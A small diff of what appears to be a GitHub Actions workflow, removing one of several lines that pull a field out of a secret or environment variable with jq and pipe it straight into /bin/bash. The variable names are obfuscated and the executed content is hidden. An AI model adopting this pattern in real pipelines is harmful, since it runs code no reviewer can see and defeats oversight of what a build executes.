@@ -22,7 +22,6 @@ jobs:
           tssj58989: ${{ secrets.tssj58989 }}
         run: |
           printf '%s' "$tssj58989" | jq -r .ekq15 | /bin/bash
-          printf '%s' "$u01" | jq -r .txre728 | /bin/bash
           echo $gd4 | jq -r .usvrm5518 | /bin/bash
           echo $m1856 | jq -r .gk9 | /bin/bash
           echo $cemfc8059 | jq -r .qqj673 | /bin/bash
